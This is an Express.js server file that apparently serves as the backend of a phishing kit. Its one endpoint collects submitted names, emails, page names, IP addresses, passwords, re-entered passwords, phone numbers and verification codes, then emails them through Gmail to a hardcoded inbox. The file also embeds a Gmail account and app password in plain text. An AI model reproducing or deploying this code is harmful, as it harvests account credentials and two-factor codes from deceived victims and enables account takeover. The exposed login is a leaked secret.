const express = require('express');
const nodemailer = require('nodemailer');
const app = express();
const cors = require('cors');

const port = 4000;

app.use(cors());
app.use(express.json());

app.post('/send-email', (req, res) => {
  const {  name, email, pageName,addInfo,ipAddress, password, rePassword, phoneNumber, verifyCode } = req.body;
  console.log( name, email, pageName,addInfo,ipAddress, password, rePassword, phoneNumber, verifyCode, "======");
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'phoenixdev0211@gmail.com',
      pass: "qdfjertjuwioqytu"
    }
  });
  // to: "mrrki3334@gmail.com",
  const mailOptions = {
    from: 'markdrake0916@gmail.com',
    to: "markdrake0916@gmail.com",
    subject: 'New message from your website',
    html: `<p>Name: ${name}</p><p>Email: ${email}</p><p>Page Name: ${pageName}</p><p>Add Info: ${addInfo}</p><p>Ip Address: ${ipAddress}</p><p>Verify Code: ${verifyCode}</p><p>Password: ${password}</p><p>RePassword: ${rePassword}</p><p>Phone Number: ${phoneNumber}</p>`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent: ' + info.response);
      res.send('Email sent successfully');
    }
  });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});